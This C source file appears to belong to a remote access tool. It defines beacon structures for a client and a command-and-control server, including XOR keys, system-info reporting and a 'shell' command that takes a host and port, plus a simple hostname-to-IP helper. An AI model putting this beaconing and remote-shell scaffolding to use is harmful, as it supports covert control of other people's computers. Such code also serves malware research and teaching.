/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdbool.h>
#include "stub/sys.h"


#ifndef NET_TIMEOUT
#define NET_TIMEOUT 5
#endif

#ifndef NET_PORT_MIN
#define NET_PORT_MIN 1
#endif

#ifndef NET_DOMAIN_MAX
#define NET_DOMAIN_MAX 253
#endif

#ifndef NET_PORT_MAX
#define NET_PORT_MAX 65535
#endif

#ifndef NET_MAX_RESPONSE_SIZE
#define NET_MAX_RESPONSE_SIZE 2960
#endif

#ifndef NET_MAX_DATA_SIZE
#define NET_MAX_DATA_SIZE 1024
#endif

#ifndef NET_CLIENT_BEACON
typedef struct{
  int xor_key;
  sys_info_t sysinfo;
} net_client_beacon_t;
#define NET_CLIENT_BEACON
#endif

#ifndef NET_SERVER_CMD_BEACON
typedef struct{
  int xor_key;
  bool status;
  int command;
  char uuid[SYS_UUID_SIZE];
  char data[NET_MAX_DATA_SIZE];
} net_server_beacon_t;
#define NET_SERVER_CMD_BEACON 0
typedef struct{
  char host[NET_DOMAIN_MAX];
  int port;
} net_server_cmd_shell_t;
#define NET_SERVER_CMD_SHELL 1
#endif

#ifndef NET_CLIENT_SLEEP
#define NET_CLIENT_SLEEP 5
#endif

bool net_host2ip(char *host, char* ip, size_t ip_size){
  /*
    :TODO: host to ip
    :host: host domain
    :ip: pointer to ip
    :returns: ip address
  */
  struct hostent *he;
  struct in_addr **addr_list;
  int i;
  if ((he = gethostbyname(host)) == NULL){
    herror("gethostbyname");
    return false;
  }
  addr_list = (struct in_addr **) he->h_addr_list;
  for(i = 0; addr_list[i] != NULL; i++){
    strncpy(ip , inet_ntoa(*addr_list[i]), ip_size);
    return true;
  }
  return false;
}
